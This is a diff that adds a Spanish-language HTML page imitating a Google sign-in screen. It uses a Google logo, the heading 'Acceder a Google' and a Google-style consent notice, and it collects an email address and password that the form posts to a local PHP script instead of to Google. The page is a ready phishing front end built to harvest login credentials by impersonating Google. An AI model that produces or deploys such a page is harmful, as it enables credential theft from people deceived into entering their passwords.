@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario</title>
+    <link rel="stylesheet"  href="CSS/formulario.css">
+</head>
+<body>
+    <header>
+        <div class="contenedor">
+            <div class="contenedor2">
+                <ul>
+                    <li>
+                        <a class="icono">
+                            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRzsv-qTKCBnLdj9EgpvjEnq4HNzXDecxU5JA&usqp=CAU" alt="">
+                        </a>
+                    </li>
+                    <li>
+                        <a class="texto">Acceder a Google</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+
+    </header>
+    <div class="form">
+        <form action="PHP/post.php" method="POST">
+            <br>
+            <label >Direccion de correo email</label>
+            <br>
+            <br>
+            <input type="email" name="correo" placeholder="google@mexico.com" required>
+            <br>
+            <br>
+            <label >Ingrese su contraseña</label>
+            <br>
+            <br>
+            <input type="contraseña" name="contraseña" placeholder="*************" required>
+            <br>
+            <br>
+            <div class="entrar">
+                <input type="submit" value="Entrar">
+            </div>
+            <div class="recuperar">
+                <input type="submit" value="¡Olvide mi contraseña!">
+            </div>
+
+            <div class="aviso">
+                <p>Para continuar,Google compartira tu nombre,direccion de correo electronico, preferencia de idioma y foto de perfil con todos 
+                    los servicios de Google.com</p>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
